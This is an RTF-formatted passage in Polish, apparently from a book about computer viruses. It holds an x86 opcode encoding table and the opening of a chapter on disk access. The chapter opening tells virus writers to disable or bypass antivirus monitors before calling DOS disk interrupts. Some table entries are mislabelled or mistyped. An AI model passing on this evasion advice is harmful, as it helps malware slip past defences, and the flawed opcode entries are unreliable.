\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 00001111 10100001                    POP FS}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 00001111 10100010                    CPUID}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 00001111 10100011 MmRejMem           BTMem,Rej}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 00001111 10100100 MmRejMem Wartkom8  SHLD Mem,Wartkom8}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 00001111 10100101 MmRejMem           SHLD Mem,Rej,CL}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 00001111 1010011D MmRejMem           CMPXCHG Mem,Rej}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 00001111 10101000                    PUSH GS}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 00001111 10101001                    POP GS}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 00001111 10101011 MmRejMem           BTS Mem,Rej}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 00001111 10101100 MmRejMem Wartkom8  SHRD Mem,Wartkom8}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 00001111 10101101 MmRejMem           SHRD Mem,Rej,CL}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 00001111 10101111 MmRejMem           IMUL Rej,Mem}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 00001111 10110010 MmRejMem           LSS Rej,Mem}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 00001111 10110011 MmRejMem           BTS Mem,Rej}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 00001111 10110100 MmRejMem           LFS Rej,Mem}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 00001111 10110101 MmRejMem           LGS Rej,Mem}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 00001111 10110110 MmRejMem           MOVZX Rej,Mem}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 00001111 10110111 MmR32Mem           MOVZX R32,Mem}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 00001111 10111011 MmRejMem           BTC Mem,Rej}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 00001111 10111100 MmRejMem           BSF Mem,Rej}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 00001111 10111101 MmRejMem           BSR Mem,Rej}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 00001111 10111110 MmRejMem           MOVSX Rej,Mem}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 00001111 10111111 MmR32Mem           MOVSX R32,Mem}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 00001111 1100000D MmRejMem           XADD Mem,Rej          }{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 00001111 11000111 Mm001Mem           CMPXCHG8B mem}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 00001111 11001r32                    BSWAP r32}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 00001111 11011010 Mm100Mem Wartkom8  BT Mem,Wartkom8}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 00001111 11011010 Mm101Mem Wartkom8  BTS Mem,Wartkom8}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 00001111 11011010 Mm110Mem Wartkom8  BTR Mem,Wartkom8}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 00001111 11011010 Mm111Mem Wartkom8  BTC Mem,Wartkom8}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 000Sg110                             PUSH rejestr segmentowy Sg }{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 000Sg111                             POP rejestr segmentowy Sg, Sg<>01,}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                      bo 00001111= rozszerzene instrukcje (w 8086 }{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                      by\uc1\u322\'b3a to instrukcja POP CS)}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 00100111                             DAA}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 00101111                             DAS}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 00110111                             AAA}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 00111111                             AAS}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 001Sg110                             przedrostek segmentu Sg}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 000pe0SD MmRejMem                    S=0,Ope Mem,Rej, S=1 Ope Reg,Mem}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 000pe10D WartkomD                    Ope Akumulator,WartkomD}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 01000Rej                             INC rejestr Rej}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 01001Rej                             DEC rejestr Rej}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 01010Rej                             PUSH rejestr Rej}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 01011Rej                             POP rejestr Rej}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 01100000                             PUSHA}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 01100001                             POPA}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 01100100                             FS:}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 01100101                             GS:}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 01100110                             przedrostek instrukcji 386+ (dane 32-bitowe)}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 01100111                             przedrostek instrukcji 386+ (operandy 32-}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                      bitowe)}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 01101000 WartkomD                    PUSH WartkomD}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 0110100D MmRejMem WartkomD           IMUL Rej,WartkomD,Mem}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 01101010 Wartkom8                    PUSH Wartkom8}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 0110110D                             INSB, INSW, INSWD}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 0110111D                             OUTSB, OUTSW, OUTSD}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 0111wwww Reladre8                    JWwww Reiadre8}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 1000000D MmOpeMem WartkomD           Ope Mem,WartkomD}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 1000001D MmOp2Mem Wartkom8           Op2 Mem, Integer (Wartkom8)}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 1000010D MmRejMem                    TEST Mem,Rej}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 1000011D MmRejMem                    XCHG Mem,rej}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 100010SD MmRejMem                    S=0, MOV Mem,Rej, S=1 MOV Reg,Mem}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 10001101 MmRejMem                    LEA Rej,Mem}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 10001111 Mm000Mem                    POP Mem}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 100011S0 MmSegMem                    S=0 MOV Mem,Seg, S=1 MOV Seg, Mem}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 10010Rej                             XCHG rejestr Rej}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 10011000                             CBW/CWDE}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 10011001                             CWD/CDQ}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 10011010 Addroffs Addrsegm           CALL FAR Addrsegm:Addroffs}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 10011011                             wait}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 10011100                             PUSHF/PUSHFD}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 10011101                             POPF/POPFD}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 10011110                             SAHF}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 10011111                             LAHF}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 101000SD WartkomD                    S=0 MOV Akumutator,[WartkomD] ; S=1 MOV [WartkomD],Akumulator}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 1010010D                             MOVSB,MOVSW, MOVSD}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 1010011D                             CMPSB, CMPSW, CMPSD}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 1010100D WartkomD                    TEST Akumulator,WartkomD}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 1010101D                             STOSB, STOSW, STOSD}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 1010110D                             LODSB, LODSW, LODSD}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 1010111D                             SCASB, SCASW, SCASD}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 1011DRej WarkomD                     MOV Rej,WartkomD}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 1100000D MmOpsMem Wartkom8           Ops Mem,Wartkom8}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 11000100 MmRejMem                    LES Rej,Mem}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 11000101 MmRejMem                    LDS Rej,Mem}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 1100011D Mm000Mem WarkomD            MOV Mem,WartkomD}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 11001100                             INT3}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 11001101 Wartkom8                    INT Wartkom8}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 11001110                             INTO}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 11001111                             IRET}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 1100F010 WartkomF                    RET WartkomF}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 1100F011                             RET N/F}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 1101000D MmOpsMem                    Ops Mem,1}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 1101001D MmOpsMem                    Ops Mem,CL}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 11010110                             SETALC}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 11010111                             XLAT}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 11100000 Reladre8                    LOOPNZ Reladre8}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 11100001 Reladre8                    LOOPZ Reiadre8}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 11100010 Reladre8                    LOOP Reladre8}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 11100011 Reladre8                    JCXZ/JECXZ Reladre8}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 11100100 Wartkom8                    AAM Wartkom8, zwykle Wartkom8=10}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 11100101 Wartkom8                    AAD Wartkom8, zwykle Wartkom8=10}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 1110010D Numport8                    IN Akumulator,Numport8}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 1110011D Numport8                    OUT Numport8,Akumulator}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 11101000 Reladr16                    CALLNEAR Reladr16}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 11101001 Reladr16                    JMP NEAR Reladr16}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 11101010 Addroffs Addrsegm           JMP FAR Addrsegm:Addroffs}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 11101011 Reladre8                    JMP SHORT Reladre8}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 1110110D                             IN Akumulator, DX}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 1110111D                             OUT DX,Akumulator}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 11110000                             LOCK}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 11110010                             REPNZ}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 11110011                             REP, REPZ}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 11110101                             CMC}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 1111011D Mm000Mem WartkomD           TEST Mem,Wartkom8}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 1111011D MmOp3Mem                    Op3 Mem}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 11111000                             CLC}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 11111001                             STC}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 11111010                             CLI}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 11111011                             STI}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 11111100                             CLD}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 11111101                             STD}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 11111110 MmOp4Mem                    Op4 Mem}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 11111111 MmOp5Mem                    Op5 Mem}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\qc\sl240\slmult1\itap0{\f0\fs28\lang1045{\*\listtag0}\abinodiroverride\ltrch ROZDZIA\uc1\u321\'a3 9}{\f0\fs28\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\qc\sl240\slmult1\itap0{\f0\fs28\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\b\lang1045{\*\listtag0}\abinodiroverride\ltrch 9.1. Sposoby dost\uc1\u281\'eapu }{\f1\fs24\b\lang1045{\*\listtag0}do dysk\'f3w}{\f0\fs24\b\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Najcz\uc1\u281\'ea\uc1\u347\'9cciej stosowany (bo najprostszy) mechanizm dost\uc1\u281\'eapu do plik\'f3w lub sektor\'f3w polega na u\uc1\u380\'bfywaniu funkcji i przerwa\uc1\u324\'f1 programowych DOS (INT 21h, INT 25h, INT 26h). Najcz\uc1\u281\'ea\uc1\u347\'9cciej korzystaj\uc1\u261\'b9 z niego wirusy plikowe i czasem wirusy BOOT-sektor\'f3w. Ze wzgl\uc1\u281\'eadu na mo\uc1\u380\'bfliwo\uc1\u347\'9c\uc1\u263\'e6 istnienia zainstalowanego w systemie monitora antywirusowego spos\'f3b ten mo\uc1\u380\'bfna bezpiecznie wykorzysta\uc1\u263\'e6 tylko po wy\uc1\u322\'b3\uc1\u261\'b9czeniu aktywnego monitora lub te\uc1\u380\'bf po znalezieniu oryginalnych procedur wej\uc1\u347\'9ccia do odpowiednich przerwa\uc1\u324\'f1.}{\f0\fs24\lang1045{\*\listtag0}\par}
